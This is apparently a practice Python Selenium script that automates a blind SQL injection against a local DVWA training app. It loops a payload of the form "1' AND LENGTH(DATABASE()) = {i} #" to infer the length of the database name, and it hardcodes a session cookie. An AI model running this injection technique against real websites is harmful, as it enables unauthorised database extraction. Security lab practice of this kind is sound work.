from selenium import webdriver
import util.alerthandling as ah
from util.driversetup import DRIVER
import requests
from requests.structures import CaseInsensitiveDict

global DRIVER
#driver = ds.setupDriver()

url = 'http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/'

headers = CaseInsensitiveDict()
headers["Cookie"] = "security=low; PHPSESSID=to84ds41bhba7ub48s10a8qim0"


for i in range(100):
    DRIVER.get(url)

    injection_message = "/html/body/div/div[3]/div/div/form/p/input[1]"
    injection_submit = "/html/body/div/div[3]/div/div/form/p/input[2]"


    parameters = f"1' AND LENGTH(DATABASE()) = {i} #"

    DRIVER.find_element_by_xpath(injection_message).send_keys(parameters)
    DRIVER.find_element_by_xpath(injection_submit).click()

    result = DRIVER.find_elements_by_xpath("/html/body/div/div[3]/div/div/pre")[0].text
    if 'exists' in result:
        print(f"Length = {i}")
        break
